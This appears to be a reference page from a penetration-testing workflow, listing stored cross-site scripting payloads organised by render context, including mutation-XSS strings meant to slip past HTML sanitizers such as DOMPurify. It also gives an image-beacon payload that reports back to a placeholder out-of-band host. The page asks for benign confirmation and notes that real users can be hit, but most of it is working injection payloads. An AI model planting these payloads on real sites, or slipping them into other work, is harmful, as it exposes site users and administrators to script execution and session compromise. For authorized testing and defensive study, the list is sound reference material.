# Stored XSS payloads: output-context + sanitizer bypass (step 6)
# Stored XSS is usually filtered on OUTPUT (and the store may sanitize too). The payload that
# counts is the one that EXECUTES on the render surface after its encoder/sanitizer.
# Record every attempt in payloads_tried.jsonl: {candidate_id, render_surface, payload, stored, rendered, executed, viewer}.
# BENIGN confirmation only — stored payloads can hit real users (see SKILL §Safety).

## Confirmation payload — prefer OOB over alert (render surface may be an unseen admin view)
```
<img src=x onerror="new Image().src='https://OOB_HOST/s?'+encodeURIComponent(location.host+document.cookie.length)">
```
Fires on view, reports back which surface/viewer executed it — works even when you can't see
the admin render. `document.cookie.length` (not the cookie) keeps it benign.

## By render context (classify at the render surface, not the store)
- **HTML body:** `<svg onload=...>` · `<img src=x onerror=...>`
- **Attribute:** `"><svg onload=...>` · (unquoted) ` onmouseover=... `
- **JS string in an inline `<script>` that echoes stored data:** `'-...-'` · `';...//`
- **Markdown → HTML** (comments/wikis): `[x](javascript:...)` · raw HTML passthrough · `<img>` in MD
- **Attribute in a templated link:** `javascript:` in a stored URL field (avatar/website)

## Against HTML sanitizers (DOMPurify & friends) — mutation XSS
Sanitized-HTML surfaces (rich comments, wikis) strip obvious vectors; look for mXSS where the
browser re-parses sanitized output into something executable:
```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=...>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=... src>">
<noscript><p title="</noscript><img src=x onerror=...>">
```
Also test: sanitizer version (retire.js/libraries.json), `svg`/`mathml` namespaces, nested
`style`/`template`, and known-CVE bypasses for the specific sanitizer + version in use.

## Store-side gotchas
- length caps / truncation may cut the payload — use short vectors.
- the store may HTML-encode but the render may decode (double-decoding) — test the round trip.
- different render surfaces of the SAME stored value may have different contexts — test each.

Pick the lowest-complexity payload that survives the specific output filter; don't escalate to
mXSS until a simple vector is proven filtered. Confirm EXECUTION cross-session (verify.md).
